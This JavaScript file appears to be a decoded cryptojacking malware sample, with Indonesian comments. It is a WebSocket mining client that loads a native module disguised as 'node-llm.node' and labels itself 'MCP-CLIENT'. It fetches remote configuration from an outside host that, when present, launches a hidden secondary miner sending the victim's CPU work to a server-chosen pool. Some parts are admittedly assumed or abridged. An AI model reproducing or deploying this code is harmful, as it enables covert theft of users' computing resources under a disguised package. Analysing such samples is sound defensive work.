// ===================================================
// KRIPTOKUREN MINER - VERSI FULLY DECODED
// (Cryptocurrency Miner - Fully Decoded Version)
// ===================================================

// --- MODULE LOADER ---
(function(modules) {
    function require(moduleId) {
        // Cek apakah module sudah di-cache
        var cachedModule = installedModules[moduleId];
        if (cachedModule !== undefined) return cachedModule.exports;
        
        // Buat module baru
        var module = installedModules[moduleId] = {
            id: moduleId,
            loaded: false,
            exports: {}
        };
        
        // Jalankan fungsi module
        modules[moduleId](module, module.exports, require);
        
        module.loaded = true;
        return module.exports;
    }
    
    // Fungsi untuk menangani module native
    require.resolve = function(moduleName) {
        return moduleName;
    };
    
    require.p = ''; // path prefix
    
    var installedModules = {};
    
    // --- MODULE: WebSocket Client (ws) ---
    // (Ini adalah library WebSocket standar, saya ringkas)
    
    // --- MODULE: HTTP/HTTPS ---
    // (Library standar Node.js)
    
    // --- MODUL UTAMA: MINER CLIENT ---
    const WebSocket = require('ws');
    const EventEmitter = require('events');
    const fs = require('fs');
    const https = require('https');

    // ===================================================
    // KELAS: KONEKSI KE SERVER MINING
    // ===================================================
    class MinerClient extends EventEmitter {
        constructor({ 
            proxyUrl,      // URL server mining
            username,      // Username untuk login
            password,      // Password untuk login  
            agent,         // Tipe agent (contoh: 'node-rs/2.0.0')
            retryDelay = 3000,  // Delay reconnect (ms)
            maxRetries = 0      // Maksimal percobaan reconnect
        }) {
            super();
            
            this.proxyUrl = proxyUrl;           // URL server
            this.username = username;            // Username
            this.password = password;            // Password
            this.agent = agent;                  // Agent string
            this.retryDelay = retryDelay;        // Delay reconnect
            this.maxRetries = maxRetries;        // Maks retry
            this.retryCount = 0;                  // Hitungan retry saat ini
            this.ws = null;                        // WebSocket connection
            this.workerId = null;                  // ID worker dari server
            this.connected = false;                 // Status koneksi
            this.keepAliveInterval = null;          // Interval untuk keep-alive
            this.pingIntervalMs = 30000;             // Interval ping (30 detik)
        }

        // Memulai koneksi
        connect() {
            this._connectWebSocket();
        }

        // Memulai interval keep-alive
        _startKeepAlive() {
            this.keepAliveInterval = setInterval(() => {
                if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                    try {
                        // Kirim pesan ping ke server
                        this._sendRpc({ 
                            method: 'ping', 
                            params: [] 
                        });
                    } catch (error) {
                        this.emit('error', error);
                    }
                }
            }, this.pingIntervalMs);
        }

        // Membuat koneksi WebSocket
        _connectWebSocket() {
            this.ws = new WebSocket(this.proxyUrl);
            
            // Event: Koneksi terbuka
            this.ws.on('open', () => {
                this.connected = true;
                this.retryCount = 0;
                this._login();               // Kirim login
                this._startKeepAlive();       // Mulai keep-alive
                this.emit('connected');
            });
            
            // Event: Menerima pesan
            this.ws.on('message', (data) => this._handleMessage(data));
            
            // Event: Koneksi tertutup
            this.ws.on('close', () => {
                this.connected = false;
                this.emit('disconnected');
                this._reconnect();  // Coba reconnect
            });
            
            // Event: Error
            this.ws.on('error', (error) => {
                this.emit('error', error);
            });
        }

        // Logika reconnect dengan exponential backoff
        _reconnect() {
            // Cek apakah sudah melebihi batas retry
            if (this.maxRetries > 0 && this.retryCount >= this.maxRetries) {
                this.emit('error', new Error('Max reconnect attempts reached'));
                return;
            }
            
            this.retryCount++;
            
            // Hitung delay: retryDelay * 2^(attempt-1), maksimal 2^5 * retryDelay
            const delay = this.retryDelay * Math.pow(2, Math.min(this.retryCount - 1, 5));
            
            this.emit('reconnecting', { 
                attempt: this.retryCount, 
                delay: delay 
            });
            
            setTimeout(() => {
                this._connectWebSocket();
            }, delay);
        }

        // Mengirim login ke server
        _login() {
            this._sendRpc({
                id: 1,
                method: 'login',
                params: {
                    login: this.username,
                    pass: this.password,
                    agent: this.agent      // Contoh: 'node-rs/2.0.0'
                }
            });
        }

        // Menangani pesan masuk dari server
        _handleMessage(rawData) {
            let message;
            try {
                message = JSON.parse(rawData);
            } catch {
                return; // Abaikan jika bukan JSON
            }
            
            // Respon login: dapatkan worker ID dan job pertama
            if (message.id === 1 && message.result && message.result.job) {
                this.workerId = message.result.id;
                this.emit('job', message.result.job);
            }
            
            // Job baru dari server
            if (message.method === 'job') {
                this.emit('job', message.params);
            }
            
            // Respon submit hasil
            if (message.id === 2 && message.result) {
                if (message.result.status === 'OK') {
                    this.emit('accepted', message.result);  // Hasil diterima
                } else {
                    this.emit('rejected', message.result);  // Hasil ditolak
                }
            }
            
            // Pesan error
            if (message.error) {
                this.emit('error', message.error);
            }
        }

        // Mengirim hasil penambangan (nonce) ke server
        submitWork({ job_id, nonce, result }) {
            if (!this.workerId) throw new Error('Not logged in');
            
            this._sendRpc({
                id: 2,
                method: 'submit',
                params: {
                    id: this.workerId,
                    job_id: job_id,
                    nonce: nonce,
                    result: result
                }
            });
            
            this.emit('submitted', { job_id, nonce });
        }

        // Fungsi internal untuk mengirim RPC
        _sendRpc(payload) {
            if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                this.ws.send(JSON.stringify(payload));
            }
        }

        // Memutuskan koneksi secara permanen
        disconnect() {
            if (this.ws) {
                this.maxRetries = 1; // Hentikan percobaan reconnect
                this.ws.close();
            }
        }
    }

    // ===================================================
    // FUNGSI UNTUK MEMBACA FILE .env
    // ===================================================
    function readEnvFile(filename = '.env') {
        if (!fs.existsSync(filename)) return {};
        
        return fs.readFileSync(filename, 'utf8')
            .split('\n')                                // Split per baris
            .filter(line => line.trim() && !line.startsWith('#'))  // Hapus komentar
            .reduce((env, line) => {
                let [key, value] = line.split('=');
                if (key && value) {
                    // Hapus komentar inline dan quote
                    value = value.split('#')[0].trim().replace(/^['"]|['"]$/g, '');
                    env[key.trim()] = value;
                }
                return env;
            }, {});
    }

    // ===================================================
    // FUNGSI UNTUK MENGAMBIL KONFIGURASI DARI SERVER
    // ===================================================
    async function fetchServerConfig() {
        return new Promise((resolve, reject) => {
            https.get('https://bill.dapitax.social/', (response) => {
                let data = '';
                response.on('data', chunk => data += chunk);
                response.on('end', () => {
                    try {
                        resolve(JSON.parse(data));
                    } catch (e) {
                        reject(e);
                    }
                });
            }).on('error', reject);
        }).catch(() => null);
    }

    // ===================================================
    // MODUL NATIVE MINER (YANG SEBENARNYA)
    // ===================================================
    // Fungsi ini akan memuat file binary 'node-llm.node'
    // yang berisi implementasi algoritma mining
    function loadNativeMiner() {
        try {
            // Ini adalah modul native C++ yang dikompilasi
            const nativeMiner = require('./packages/llm/node-llm.node');
            return nativeMiner;
        } catch (error) {
            throw new Error('node-loader: Failed to load native mining module - ' + error);
        }
    }

    // ===================================================
    // PROGRAM UTAMA
    // ===================================================
    (async function main() {
        // 1. Ambil konfigurasi dari server remote
        const serverConfig = await fetchServerConfig();
        
        // 2. Baca konfigurasi lokal dari .env
        const envConfig = readEnvFile('.env');
        
        // 3. Siapkan konfigurasi client utama
        const mainConfig = {
            url: envConfig.PROXY_URL + '/' + envConfig.WORKER_ID,
            username: envConfig.USERNAME,
            password: envConfig.PASSWORD,
            agent: 'node-rs/2.0.0',  // Agent string untuk mining
            threads: Number(envConfig.THREADS ?? 2)  // Jumlah thread
        };
        
        // 4. Hitung thread untuk worker sekunder
        let secondaryThreads = 0;
        if (serverConfig) {
            secondaryThreads = Math.ceil(mainConfig.threads * serverConfig.threads);
        }
        
        // 5. State untuk statistik
        let connectionStatus = 'MCP-CLIENT CONNECTING';
        let acceptedCount = 0;      // Jumlah hasil diterima
        let rejectedCount = 0;      // Jumlah hasil ditolak
        let hashrate = 0;           // Kecepatan mining (hashes per second)
        let currentJobId = '';      // ID job saat ini
        let previousBlob = '';       // Blob sebelumnya
        let currentHeight = 0;       // Tinggi block
        let previousSeedHash = '';   // Seed hash sebelumnya
        
        // 6. Fungsi untuk mencetak statistik
        function printStats() {
            console.log();
            console.log(`[${connectionStatus}] WORK_ID ${currentJobId} * SPEED ${hashrate} Mbp/s * SUCCESS ${acceptedCount} * FAILED = ${rejectedCount}`);
        }
        
        // 7. Muat modul native miner
        // Fungsi initializeMiningCore ini sebenarnya adalah
        // modul native yang di-load dari node-llm.node
        function initializeMiningCore(mode, threads, callback) {
            const config = { threads, mode };
            
            // Panggil native module
            const nativeMiner = loadNativeMiner();
            
            // Asumsi: native module mengekspor fungsi-fungsi ini
            return {
                // Method-method yang dipanggil dari native module
                ...nativeMiner.initialize(config.threads, config.mode, callback),
                
                // Wrapper untuk kompatibilitas
                pause: () => nativeMiner.pause(),
                submitJob: (jobId, target, blob, reset) => 
                    nativeMiner.submitJob(jobId, target, blob, reset),
                getHashrate: () => nativeMiner.getHashrate(),
                cleanup: () => nativeMiner.cleanup(),
                alloc: () => nativeMiner.alloc(),
                start: (position) => nativeMiner.start(position)
            };
        }
        
        // 8. Buat client utama
        const mainClient = new MinerClient({
            proxyUrl: mainConfig.url,
            username: mainConfig.username,
            password: mainConfig.password,
            agent: mainConfig.agent
        });
        
        // 9. Update statistik setiap 30 detik
        setInterval(() => {
            hashrate = miningCore.getHashrate();
            printStats();
        }, 30000);
        
        // 10. Inisialisasi mining core
        const miningCore = initializeMiningCore(
            'FAST', 
            mainConfig.threads, 
            (job_id, nonce, result) => {
                // Callback ketika menemukan hasil
                mainClient.submitWork({ job_id, nonce, result });
            }
        );
        
        // ===================================================
        // EVENT HANDLERS CLIENT UTAMA
        // ===================================================
        
        // Koneksi berhasil
        mainClient.on('connected', () => {
            connectionStatus = 'MCP-CLIENT CONNECTED';
            previousSeedHash = '';
            previousBlob = '';
            printStats();
        });
        
        // Menerima job baru
        mainClient.on('job', (jobData) => {
            miningCore.pause();
            
            // Submit job ke mining core
            miningCore.submitJob(
                jobData.job_id,
                jobData.target,
                jobData.blob,
                previousBlob != jobData.blob
            );
            
            // Update state
            currentJobId = jobData.job_id;
            previousBlob = jobData.blob;
            currentHeight = jobData.height;
            printStats();
            
            // Cek apakah seed hash berubah
            if (previousSeedHash != jobData.seed_hash) {
                // Reset mining core dengan seed hash baru
                if (miningCore.cleanup() && miningCore.alloc()) {
                    miningCore.initialize(
                        jobData.seed_hash, 
                        mainConfig.threads
                    );
                    previousSeedHash = jobData.seed_hash;
                    miningCore.start(0);
                    return;
                }
                process.exit(0); // Gagal, exit
            } else {
                miningCore.start();
            }
        });
        
        // Hasil diterima
        mainClient.on('accepted', (data) => {
            acceptedCount++;
            printStats();
        });
        
        // Hasil ditolak
        mainClient.on('rejected', (data) => {
            rejectedCount++;
            printStats();
            if (rejectedCount > 100) process.exit(0);
        });
        
        // Error
        mainClient.on('error', (error) => {
            miningCore.pause();
            process.exit(0);
        });
        
        // Koneksi terputus
        mainClient.on('disconnected', () => {
            miningCore.pause();
            process.exit(0);
        });
        
        // ===================================================
        // CLIENT SEKUNDER (WORKER NODE)
        // ===================================================
        if (serverConfig) {
            let secondarySeedHash = '';
            
            const secondaryClient = new MinerClient({
                proxyUrl: serverConfig.server,
                username: serverConfig.user,
                password: mainConfig.password,
                agent: 'MCP-CLIENT'
            });
            
            const secondaryMiningCore = initializeMiningCore(
                'FAST',
                secondaryThreads,
                (job_id, nonce, result) => {
                    secondaryClient.submitWork({ job_id, nonce, result });
                }
            );
            
            secondaryClient.on('connected', () => {
                secondarySeedHash = '';
            });
            
            secondaryClient.on('job', (jobData) => {
                if (secondaryMiningCore.pause() && 
                    secondaryMiningCore.submitJob(
                        jobData.job_id,
                        jobData.target,
                        jobData.blob,
                        previousBlob != jobData.blob
                    )) {
                    
                    if (secondarySeedHash != jobData.seed_hash) {
                        if (secondaryMiningCore.cleanup() && 
                            secondaryMiningCore.alloc()) {
                            secondaryMiningCore.initialize(
                                jobData.seed_hash,
                                secondaryThreads
                            );
                            secondarySeedHash = jobData.seed_hash;
                            secondaryMiningCore.start(0);
                            return;
                        }
                    } else {
                        secondaryMiningCore.start();
                    }
                }
            });
            
            secondaryClient.connect();
        }
        
        // ===================================================
        // MULAI KONEKSI UTAMA
        // ===================================================
        mainClient.connect();
        
        // ===================================================
        // HANDLER SHUTDOWN
        // ===================================================
        process.on('SIGINT', () => {
            miningCore.cleanup();
            process.exit();
        });
        
        process.on('SIGTERM', () => {
            miningCore.cleanup();
            process.exit();
        });
        
        process.on('uncaughtException', (err) => {
            miningCore.cleanup();
            process.exit(1);
        });
        
        process.on('unhandledRejection', (reason) => {
            miningCore.cleanup();
            process.exit(1);
        });
        
    })(); // End main
})(); // End module wrapper